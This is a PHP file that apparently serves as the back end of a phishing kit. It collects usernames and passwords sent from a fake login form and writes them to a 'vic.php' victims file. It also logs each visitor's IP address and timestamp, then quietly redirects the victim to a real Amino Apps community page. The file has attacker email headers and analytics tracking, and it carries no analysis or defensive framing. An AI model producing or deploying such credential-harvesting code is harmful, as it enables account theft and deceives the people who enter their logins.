<?php
$username = $_GET['username'];
$password = $_GET['password'];
?>

<?php
include ('admin/config.php');
$headers = "From: alaseel7772@gmail.com";
$headers.= "Content-type: text/html";
$handle = fopen("admin/vic.php", "a");

$body = '

___________________________
<br>
<br>	Username   =   '.$username.'
<br>	Password   =   '.$password.'
<br>
___________________________
<br>
';


	$file = fopen("admin/vic.php", "a");
	fwrite($file, $body);

$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
file_put_contents('admin/VisitorsIP.log', $line . PHP_EOL, FILE_APPEND);
?>

<?php
include ('admin/config.php');
$url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
?>
<html>
  <head>
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159654279-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-159654279-2');
</script>

    <meta http-equiv="Refresh" content="0; url=https://aminoapps.com/c/art-arabic/home/" />
  </head>
  <body>
  </body>
</html>
